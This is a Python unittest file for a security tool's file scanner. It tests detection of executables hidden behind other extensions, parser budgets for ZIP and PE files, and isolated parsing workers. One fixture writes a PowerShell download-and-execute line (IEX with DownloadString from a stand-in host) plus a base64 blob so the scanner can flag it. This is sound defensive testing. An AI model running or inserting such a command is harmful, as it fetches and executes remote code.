from pathlib import Path
import json
import os
import struct
import subprocess
from tempfile import TemporaryDirectory
import unittest
from unittest import mock
import zipfile

from monarch_security.analysis import RuleEngine
from monarch_security.config import FileConfig, load_config
from monarch_security.policy import PolicyEngine
from monarch_security.sensors.files import (
    ARCHIVE_CENTRAL_DIRECTORY_MAX_BYTES,
    ARCHIVE_METADATA_MAX_ENTRIES,
    PE_MAX_OPTIONAL_HEADER_BYTES,
    PE_MAX_SECTIONS,
    FileScanner,
)


class DeepFileScanTests(unittest.TestCase):
    def test_file_scan_uses_an_isolated_budgeted_worker(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "sample.exe"
            path.write_bytes(_minimal_pe())

            event = FileScanner(load_config().files).inspect(path)

            self.assertEqual(event.facts["content_parser_status"], "ok")
            self.assertTrue(event.facts["content_parser_isolated"])
            sandbox = event.facts["content_parser_sandbox"]
            self.assertEqual(sandbox["process"], "isolated-worker")
            self.assertEqual(sandbox["memory_limit_bytes"], 268_435_456)
            if os.name == "nt":
                self.assertEqual(sandbox["integrity"], "low")
                self.assertEqual(sandbox["memory_limit"], "windows-job")

    def test_full_local_scan_cannot_be_called_outside_worker_contract(self):
        scanner = FileScanner(load_config().files)
        with mock.patch.dict(os.environ, {}, clear=False):
            os.environ.pop("MONARCH_SECURITY_FILE_PARSER_WORKER", None)
            with self.assertRaisesRegex(RuntimeError, "isolated parser worker"):
                scanner._inspect_local(Path("not-opened.bin"))

    def test_pe_hidden_behind_text_extension_scores_high(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "invoice.txt"
            path.write_bytes(_minimal_pe())

            config = load_config()
            event = FileScanner(config.files).inspect(path)
            assessment = RuleEngine(config.router).assess(event)

            self.assertEqual(event.facts["magic_type"], "pe")
            self.assertTrue(event.facts["pe_valid"])
            self.assertGreaterEqual(assessment.score, 35)
            self.assertIn(
                "PE executable content is hidden behind a non-PE extension",
                assessment.reasons,
            )

    def test_hidden_pe_detection_is_extension_agnostic_without_flagging_declared_pe(self):
        with TemporaryDirectory() as directory:
            root = Path(directory)
            config = load_config()
            rules = RuleEngine(config.router)

            for name in ("invoice.pdf", "photo.jpg", "README"):
                with self.subTest(name=name):
                    path = root / name
                    path.write_bytes(_minimal_pe())
                    assessment = rules.assess(FileScanner(config.files).inspect(path))
                    self.assertGreaterEqual(assessment.score, 35)
                    self.assertEqual(assessment.route, "deep_scan")
                    self.assertIn(
                        "PE executable content is hidden behind a non-PE extension",
                        assessment.reasons,
                    )

            declared = root / "declared.exe"
            declared.write_bytes(_minimal_pe())
            declared_assessment = rules.assess(FileScanner(config.files).inspect(declared))
            self.assertNotIn(
                "PE executable content is hidden behind a non-PE extension",
                declared_assessment.reasons,
            )

    def test_suspicious_script_markers_route_to_llm_threshold(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "update.ps1"
            path.write_text(
                "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')\n"
                "$d=[Convert]::FromBase64String('"
                + ("A" * 128)
                + "')\n",
                encoding="utf-8",
            )

            config = load_config()
            event = FileScanner(config.files).inspect(path)
            assessment = RuleEngine(config.router).assess(event)

            self.assertIn("script_suspicious_markers", event.facts)
            self.assertTrue(event.facts["script_contains_base64_blob"])
            self.assertGreaterEqual(assessment.score, 65)
            self.assertEqual(assessment.route, "llm")

    def test_file_decision_includes_safe_controls(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "payload.exe"
            path.write_bytes(_minimal_pe())

            config = load_config()
            event = FileScanner(config.files).inspect(path)
            assessment = RuleEngine(config.router).assess(event)
            decision = PolicyEngine(config.policy).local_decision(assessment)

            self.assertTrue(decision.controls)
            self.assertTrue(
                any("Defender" in control or "Authenticode" in control for control in decision.controls)
            )

    def test_pe_section_count_is_rejected_before_section_sampling(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "many-sections.exe"
            path.write_bytes(_pe_header(section_count=0xFFFF, optional_header_size=0))
            scanner = FileScanner(load_config().files)

            with mock.patch("monarch_security.sensors.files._section_entropy") as entropy:
                facts = scanner._pe_facts(path)

            entropy.assert_not_called()
            self.assertFalse(facts["pe_valid"])
            self.assertEqual(facts["pe_section_count"], 0xFFFF)
            self.assertEqual(facts["pe_section_limit"], PE_MAX_SECTIONS)
            self.assertTrue(facts["pe_metadata_budget_exceeded"])
            self.assertIn("section count", facts["pe_error"])

    def test_pe_optional_header_and_aggregate_section_reads_are_bounded(self):
        with TemporaryDirectory() as directory:
            root = Path(directory)
            oversized = root / "oversized-optional.exe"
            oversized.write_bytes(
                _pe_header(
                    section_count=1,
                    optional_header_size=PE_MAX_OPTIONAL_HEADER_BYTES + 1,
                )
            )
            scanner = FileScanner(load_config().files)
            oversized_facts = scanner._pe_facts(oversized)
            self.assertTrue(oversized_facts["pe_metadata_budget_exceeded"])
            self.assertIn("optional header", oversized_facts["pe_error"])

            sampled = root / "sample-budget.exe"
            sampled.write_bytes(_pe_with_sections(5, raw_size=2))
            with mock.patch(
                "monarch_security.sensors.files.PE_SECTION_SAMPLE_TOTAL_BYTES",
                3,
            ):
                sampled_facts = scanner._pe_facts(sampled)
            self.assertTrue(sampled_facts["pe_valid"])
            self.assertEqual(sampled_facts["pe_section_sampled_bytes"], 3)
            self.assertTrue(sampled_facts["pe_section_entropy_truncated"])

    def test_zip_declared_count_and_central_directory_size_fail_closed(self):
        with TemporaryDirectory() as directory:
            root = Path(directory)
            cases = (
                (
                    "too-many.zip",
                    ARCHIVE_METADATA_MAX_ENTRIES + 1,
                    0,
                ),
                (
                    "too-wide.zip",
                    1,
                    ARCHIVE_CENTRAL_DIRECTORY_MAX_BYTES + 1,
                ),
            )
            scanner = FileScanner(load_config().files)
            rules = RuleEngine(load_config().router)
            for name, entries, directory_bytes in cases:
                with self.subTest(name=name):
                    path = root / name
                    path.write_bytes(_zip_eocd(entries, directory_bytes))
                    event = scanner.inspect(path)
                    assessment = rules.assess(event)
                    self.assertTrue(event.facts["archive_metadata_budget_exceeded"])
                    self.assertTrue(event.facts["archive_entries_truncated"])
                    self.assertEqual(event.facts["archive_entry_count"], entries)
                    self.assertGreaterEqual(assessment.score, 35)
                    self.assertEqual(assessment.route, "deep_scan")
                    self.assertIn(
                        "Archive metadata exceeds the safe parser budget",
                        assessment.reasons,
                    )

    def test_zip_metadata_scan_reaches_executable_entry_after_old_200_item_boundary(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "tail-entry.zip"
            with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_STORED) as archive:
                for index in range(250):
                    archive.writestr(f"safe-{index:03d}.txt", b"")
                archive.writestr("invoice.pdf.exe", b"MZ")

            event = FileScanner(load_config().files).inspect(path)

            self.assertEqual(event.facts["archive_entry_count"], 251)
            self.assertEqual(event.facts["archive_entries_scanned"], 251)
            self.assertFalse(event.facts["archive_entries_truncated"])
            self.assertEqual(
                event.facts["archive_executable_entries"],
                ["invoice.pdf.exe"],
            )
            self.assertEqual(
                event.facts["archive_double_extension_entries"],
                ["invoice.pdf.exe"],
            )

    def test_zip_long_entry_name_keeps_terminal_extension_for_analysis(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "long-name.zip"
            long_name = "folder/" + ("a" * 700) + ".pdf.exe"
            with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_STORED) as archive:
                archive.writestr(long_name, b"")

            event = FileScanner(load_config().files).inspect(path)

            [reported] = event.facts["archive_executable_entries"]
            self.assertLessEqual(len(reported), 512)
            self.assertTrue(reported.endswith(".pdf.exe"))
            self.assertIn("…", reported)
            self.assertEqual(
                event.facts["archive_double_extension_entries"],
                [reported],
            )

    def test_parser_timeout_becomes_reviewable_event_instead_of_blocking(self):
        scanner = FileScanner(FileConfig(parser_timeout_seconds=0.5))
        with mock.patch(
            "monarch_security.file_parser_worker.subprocess.run",
            side_effect=subprocess.TimeoutExpired(["python"], 0.5),
        ):
            event = scanner.inspect(Path("boundary.zip"))
        assessment = RuleEngine(load_config().router).assess(event)

        self.assertEqual(event.facts["content_parser_status"], "timeout")
        self.assertTrue(event.facts["content_parser_isolated"])
        self.assertEqual(assessment.route, "deep_scan")
        self.assertIn(
            "File inspection did not complete within the isolated parser budget",
            assessment.reasons,
        )

    def test_missing_file_error_crosses_worker_boundary_without_false_event(self):
        with TemporaryDirectory() as directory:
            missing = Path(directory) / "missing.bin"
            with self.assertRaises(OSError):
                FileScanner(load_config().files).inspect(missing)

    def test_worker_io_error_is_reviewable_instead_of_silently_clean(self):
        response = {
            "schema": 1,
            "ok": False,
            "error_kind": "os",
            "error_type": "PermissionError",
            "errno": 13,
            "error": "read access unavailable",
        }
        completed = subprocess.CompletedProcess(
            args=["python"],
            returncode=0,
            stdout=json.dumps(response, sort_keys=True).encode("utf-8"),
            stderr=b"",
        )
        with mock.patch(
            "monarch_security.file_parser_worker.subprocess.run",
            return_value=completed,
        ):
            event = FileScanner(load_config().files).inspect(Path("restricted.zip"))
        assessment = RuleEngine(load_config().router).assess(event)

        self.assertEqual(event.facts["content_parser_status"], "io_error")
        self.assertEqual(assessment.route, "deep_scan")


def _minimal_pe() -> bytes:
    data = bytearray(1024)
    data[:2] = b"MZ"
    pe_offset = 0x80
    struct.pack_into("<I", data, 0x3C, pe_offset)
    data[pe_offset : pe_offset + 4] = b"PE\x00\x00"
    struct.pack_into(
        "<HHIIIHH",
        data,
        pe_offset + 4,
        0x8664,
        1,
        0,
        0,
        0,
        0xF0,
        0,
    )
    optional_offset = pe_offset + 24
    struct.pack_into("<H", data, optional_offset, 0x20B)
    struct.pack_into("<H", data, optional_offset + 68, 3)
    section_offset = optional_offset + 0xF0
    data[section_offset : section_offset + 8] = b".text\x00\x00\x00"
    struct.pack_into("<I", data, section_offset + 16, 64)
    struct.pack_into("<I", data, section_offset + 20, 0x300)
    data[0x300 : 0x340] = b"\x90" * 64
    return bytes(data)


def _pe_header(*, section_count: int, optional_header_size: int) -> bytes:
    data = bytearray(0x80 + 24)
    data[:2] = b"MZ"
    struct.pack_into("<I", data, 0x3C, 0x80)
    data[0x80:0x84] = b"PE\x00\x00"
    struct.pack_into(
        "<HHIIIHH",
        data,
        0x84,
        0x8664,
        section_count,
        0,
        0,
        0,
        optional_header_size,
        0,
    )
    return bytes(data)


def _pe_with_sections(section_count: int, *, raw_size: int) -> bytes:
    pe_offset = 0x80
    table_offset = pe_offset + 24
    data_offset = table_offset + section_count * 40
    data = bytearray(data_offset + section_count * raw_size)
    data[: len(_pe_header(section_count=section_count, optional_header_size=0))] = _pe_header(
        section_count=section_count,
        optional_header_size=0,
    )
    for index in range(section_count):
        section = table_offset + index * 40
        data[section : section + 8] = f"s{index}".encode("ascii").ljust(8, b"\x00")
        struct.pack_into("<I", data, section + 16, raw_size)
        struct.pack_into("<I", data, section + 20, data_offset + index * raw_size)
        start = data_offset + index * raw_size
        data[start : start + raw_size] = bytes([index + 1]) * raw_size
    return bytes(data)


def _zip_eocd(entries: int, directory_bytes: int) -> bytes:
    return struct.pack(
        "<4s4H2LH",
        b"PK\x05\x06",
        0,
        0,
        entries,
        entries,
        directory_bytes,
        0,
        0,
    )
